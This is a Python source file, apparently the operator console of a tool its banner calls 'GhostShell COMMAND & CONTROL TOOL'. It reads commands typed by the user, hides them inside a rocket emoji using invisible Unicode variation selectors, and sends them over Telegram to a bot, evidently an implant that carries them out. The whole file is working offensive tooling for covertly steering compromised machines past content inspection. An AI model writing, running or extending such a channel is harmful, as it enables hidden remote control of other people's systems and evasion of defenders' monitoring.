import asyncio
from telethon import TelegramClient

VARIATION_SELECTOR_START = 0xFE00
VARIATION_SELECTOR_END = 0xFE0F
VARIATION_SELECTOR_SUPPLEMENT_START = 0xE0100
VARIATION_SELECTOR_SUPPLEMENT_END = 0xE01EF

def to_variation_selector(byte: int) -> str | None:
    if 0 <= byte < 16:
        return chr(VARIATION_SELECTOR_START + byte)
    elif 16 <= byte < 256:
        return chr(VARIATION_SELECTOR_SUPPLEMENT_START + byte - 16)
    return None

def encode(emoji: str, text: str) -> str:
    bytes_data = text.encode("utf-8")
    return emoji + ''.join(to_variation_selector(b) for b in bytes_data if to_variation_selector(b))

def from_variation_selector(code_point: int) -> int | None:
    if VARIATION_SELECTOR_START <= code_point <= VARIATION_SELECTOR_END:
        return code_point - VARIATION_SELECTOR_START
    elif VARIATION_SELECTOR_SUPPLEMENT_START <= code_point <= VARIATION_SELECTOR_SUPPLEMENT_END:
        return code_point - VARIATION_SELECTOR_SUPPLEMENT_START + 16
    return None

def decode(text: str) -> str:
    decoded_bytes = []
    for char in text:
        byte = from_variation_selector(ord(char))
        if byte is None and decoded_bytes:
            break
        elif byte is None:
            continue
        decoded_bytes.append(byte)
    return bytes(decoded_bytes).decode("utf-8")

async def send_command(client, chat, emoji, command):
    encoded_command = encode(emoji, command)
    await client.send_message(chat, encoded_command)

async def main():
    API_ID = APIID  # must be int
    API_HASH = "APIHASH"  
    BOT_USERNAME = "@YOURBOTUSERNAME"  
    EMOJI = "\U0001F680"  # 🚀 may be changed

    client = TelegramClient("session_name", API_ID, API_HASH)
    await client.start()
    
    try:
        bot_entity = await client.get_entity(BOT_USERNAME)
    except Exception as e:
        print(f"Ошибка: {e}")
        await client.disconnect()
        return
    
    print('''
                    .-"______"-.
                   /            \
       _          |              |          _
      ( \         |,  .-.  .-.  ,|         / )
       > "=._     | )(__/  \__)( |     _.=" <
      (_/"=._"=._ |/     /\     \| _.="_.="\_)
             "=._ (_     ^^     _)"_.="
                 "=\__|IIIIII|__/="
                _.="| \IIIIII/ |"=._
      _     _.="_.="\          /"=._"=._     _
     ( \_.="_.="     `--------`     "=._"=._/ )
      > _.="                            "=._ <
     (_/                                    \_)
        GhostShell COMMAND & CONTROL TOOL
        Author: @s0ld13r''')
    
    print("Emoji Command Console. Type commands to send to the bot. Type 'exit' to quit.")

    while True:
        command = input("> ").strip()
        if command.lower() == "exit":
            break
        await send_command(client, bot_entity, EMOJI, command)
        print("Command sent!")

    await client.disconnect()

if __name__ == "__main__":
    asyncio.run(main())
